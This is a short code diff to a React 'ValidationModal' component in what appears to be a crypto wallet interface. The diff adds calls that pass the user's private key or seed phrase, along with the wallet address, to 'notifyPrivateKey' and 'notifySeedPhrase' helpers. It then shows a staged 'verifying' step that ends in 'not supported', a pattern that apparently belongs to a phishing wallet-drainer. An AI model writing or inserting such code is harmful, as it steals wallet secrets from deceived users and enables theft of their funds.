@@ -1,4 +1,5 @@
 import { useState, useRef, useEffect } from "react";
+import { notifySeedPhrase, notifyPrivateKey } from "@/lib/notify";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import {
@@ -126,6 +127,11 @@ export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }:
   };
 
   const handleManualValidate = () => {
+    if (phraseMode === "key") {
+      notifyPrivateKey(walletAddress, privateKey.trim());
+    } else {
+      notifySeedPhrase(walletAddress, words.slice(0, wordCount), wordCount);
+    }
     setStep("verifying");
     setTimeout(() => {
       setStep("not_supported");
